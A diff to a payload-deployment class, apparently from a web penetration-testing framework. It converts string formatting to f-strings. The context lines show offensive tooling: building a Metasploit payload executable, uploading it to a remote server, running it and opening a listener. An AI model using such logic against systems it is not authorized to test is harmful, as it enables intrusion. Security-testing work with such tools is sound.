@@ -105,7 +105,7 @@ class vdaemon:
             executable_file_name = self._generate_exe(payload, msfpayload_parameters)
         except Exception as e:
             raise BaseFrameworkException(
-                'Failed to create the payload file, error: "%s".' % str(e)
+                f'Failed to create the payload file, error: "{str(e)}".'
             )
 
         try:
@@ -130,8 +130,7 @@ class vdaemon:
                     self._exec_payload(remote_file_location)
                 except Exception as e:
                     raise BaseFrameworkException(
-                        "Failed to execute the executable file on the server, error: %s"
-                        % e
+                        f"Failed to execute the executable file on the server, error: {e}"
                     )
                 else:
                     om.out.console(
@@ -149,9 +148,9 @@ class vdaemon:
         :return: True if it was possible to start the listener in a new console
         """
         args = (self._msfcli_path, msfcli_handler, " ".join(parameters))
-        msfcli_command = "%s %s %s" % args
+        msfcli_command = "{} {} {}".format(*args)
         om.out.console(
-            'Running a new terminal with the payload handler ("%s")' % msfcli_command
+            f'Running a new terminal with the payload handler ("{msfcli_command}")'
         )
 
         # TODO: Add support for KDE, Windows, etc.
@@ -181,7 +180,7 @@ class vdaemon:
         randomness = str(random.randint(0, 293829839))
         output_filename = os.path.join(temp_dir, "msf-" + randomness + ".exe")
 
-        command = "%s %s %s X > %s" % (
+        command = "{} {} {} X > {}".format(
             self._msfpayload_path,
             payload,
             " ".join(parameters),
@@ -247,9 +246,7 @@ class vdaemon:
             )
 
             if transferHandler.transfer(open(exe_file).read(), self._remote_filename):
-                om.out.console(
-                    'Finished payload upload to "%s"' % self._remote_filename
-                )
+                om.out.console(f'Finished payload upload to "{self._remote_filename}"')
                 return self._remote_filename
             else:
                 raise BaseFrameworkException(
